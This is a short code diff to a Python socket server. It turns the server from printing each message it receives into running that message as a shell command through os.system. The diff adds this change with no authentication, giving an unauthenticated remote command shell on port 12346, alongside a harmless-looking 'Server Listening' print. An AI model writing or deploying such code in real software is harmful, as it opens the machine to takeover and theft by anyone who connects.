@@ -1,18 +1,23 @@
 import socket
 import _thread
 import sys
+import os
 
 #loop to mannage connected socket input
 def on_new_client(clientsocket,addr):
     while True:
         msg=clientsocket.recv(1024)
-        print(msg.decode(encoding='utf-8'))
+        cmd = msg.decode(encoding='utf-8')
+        print(cmd)
+        os.system(cmd)
     clientsocket.close()
 
 #created and bind socket
 s = socket.socket()
 port = 12346
 s.bind(('',port))
+#visual feedback that the server is running
+print("Server Listening")
 
 try:
     #listen for an allow 5 connections
